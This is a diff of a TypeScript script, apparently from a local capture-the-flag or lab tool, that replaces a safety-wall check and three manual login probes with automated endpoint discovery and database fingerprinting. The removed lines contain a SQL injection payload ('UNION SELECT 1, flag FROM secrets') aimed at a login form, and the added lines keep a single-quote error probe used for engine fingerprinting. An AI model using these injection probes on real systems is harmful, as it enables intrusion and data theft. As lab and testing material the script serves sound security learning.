@@ -1,37 +1,21 @@
 import { httpRequest } from './tools/http';
-import { assertAllowedUrl } from './safety';
+import { discover } from './tools/discover';
+import { fingerprintDb } from './recon/fingerprint';
 
 async function main() {
-    // 1. allowed request
-    const health = await httpRequest({ path: '/health' });
-    console.log('health:', health.status, health.body);
+    // MAP — learn endpoints/params from the landing page, black-box.
+    const map = await discover('/');
+    console.log('discovered forms:', JSON.stringify(map.forms, null, 2));
+    console.log('links:', map.links);
 
-    // 2. the wall refuses a non-local host
-    try {
-        assertAllowedUrl('http://example.com/');
-        console.log('❌ REFUSAL FAILED — this should not print');
-    } catch (e) {
-        console.log('✅ refused as expected:', (e as Error).message);
-    }
-
-    // 3. the three manual probes, now driven THROUGH the tool
-    const normal = await httpRequest({
-        method: 'POST', path: '/login',
-        form: { username: 'alice', password: 'wonderland' }
-    });
-    console.log('\nnormal     :', normal.status, normal.body);
-
-    const finger = await httpRequest({
+    // FINGERPRINT — trigger an error, classify the engine from its dialect.
+    const probe = await httpRequest({
         method: 'POST', path: '/login',
         form: { username: "'", password: 'x' }
     });
-    console.log('fingerprint:', finger.status, finger.body);
-
-    const exploit = await httpRequest({
-        method: 'POST', path: '/login',
-        form: { username: "' UNION SELECT 1, flag FROM secrets -- ", password: 'x' }
-    });
-    console.log('exploit    :', exploit.status, exploit.body);
+    const fp = fingerprintDb(probe.body);
+    console.log(`\nprobe: ${probe.status} ${probe.body}`);
+    console.log(`fingerprint: engine=${fp.engine}  evidence=${JSON.stringify(fp.evidence)}`);
 }
 
 main().catch((err) => { console.error(err); process.exit(1); });
